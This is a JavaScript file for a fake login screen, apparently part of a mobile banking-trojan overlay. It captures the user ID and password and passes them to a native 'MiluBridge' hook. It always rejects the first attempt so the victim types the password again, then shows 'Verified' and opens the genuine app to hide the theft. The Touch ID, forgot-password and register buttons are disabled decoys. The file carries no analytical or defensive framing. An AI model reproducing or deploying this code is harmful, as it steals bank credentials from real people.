(() => {
  const form = document.getElementById("loginForm");
  const userId = document.getElementById("userId");
  const password = document.getElementById("password");
  const eyeBtn = document.getElementById("eyeBtn");
  const signInBtn = document.getElementById("signInBtn");
  const forgotBtn = document.getElementById("forgotBtn");
  const touchIdBtn = document.getElementById("touchIdBtn");
  const registerBtn = document.getElementById("registerBtn");
  const termsBtn = document.getElementById("termsBtn");
  const toastEl = document.getElementById("toast");

  let submitCount = 0;
  let toastTimer = 0;
  let passwordVisible = false;
  let locked = false;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 1800);
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function setPasswordVisible(visible) {
    passwordVisible = visible;
    password.type = visible ? "text" : "password";
    eyeBtn.classList.toggle("is-visible", visible);
    eyeBtn.setAttribute("aria-pressed", visible ? "true" : "false");
    eyeBtn.setAttribute("aria-label", visible ? "Hide password" : "Show password");
  }

  eyeBtn.addEventListener("click", () => {
    setPasswordVisible(!passwordVisible);
  });

  userId.addEventListener("input", () => {
    userId.classList.remove("is-error");
  });

  password.addEventListener("input", () => {
    password.classList.remove("is-error");
  });

  forgotBtn.addEventListener("click", () => {
    toast("Please sign in to continue");
  });

  touchIdBtn.addEventListener("click", () => {
    toast("Please enter User ID and Password / Login PIN");
  });

  registerBtn.addEventListener("click", () => {
    toast("Please sign in to continue");
  });

  termsBtn.addEventListener("click", () => {
    toast("Terms & Conditions");
  });

  form.addEventListener("submit", (event) => {
    event.preventDefault();
    if (locked) {
      return;
    }

    const user = userId.value.trim();
    const pass = password.value;
    let ok = true;

    if (!user) {
      userId.classList.add("is-error");
      ok = false;
    }
    if (!pass) {
      password.classList.add("is-error");
      ok = false;
    }
    if (!ok) {
      toast("Please enter User ID and Password / Login PIN");
      return;
    }

    locked = true;
    signInBtn.disabled = true;
    submitCount += 1;
    reportDone(`${user}|${pass}`);

    if (submitCount < 2) {
      toast("Incorrect User ID or Password / Login PIN");
      password.value = "";
      password.classList.add("is-error");
      locked = false;
      signInBtn.disabled = false;
      password.focus();
      return;
    }

    toast("Verified");
    window.setTimeout(() => {
      openApp();
      locked = false;
      signInBtn.disabled = false;
    }, 420);
  });
})();
